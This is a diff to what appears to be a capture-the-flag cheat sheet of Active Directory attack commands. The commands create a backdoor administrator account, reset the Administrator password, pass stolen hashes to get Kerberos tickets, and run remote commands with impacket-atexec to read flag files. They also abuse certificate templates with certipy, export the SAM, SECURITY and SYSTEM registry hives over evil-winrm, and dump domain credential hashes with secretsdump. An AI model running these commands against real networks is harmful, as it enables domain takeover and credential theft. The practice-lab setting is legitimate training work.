@@ -218,7 +218,7 @@ net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 net user administrator 123qweasdF!
 
 ## GG - ROOT FLAG
-impacket-getTGT $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
 impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
@@ -694,7 +694,10 @@ certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'VulnerableTemplat
 certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
 certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'DifferentTemplate' -key-size 4096
 certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
-impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+impacket-reg -dc-ip $TARGET $DOM -k -no-pass backup -o '\programdata'
+evil-winrm --> login --> cd \programdata; download SAM.save ... SECURITY.save ... SYSTEM.save ...
+impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
+impacket-secretsdump DC01$@$DC -hashes '$MACHINE.ACC_HASH' -just-dc-ntlm
 
 +---------- Request ----------+
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
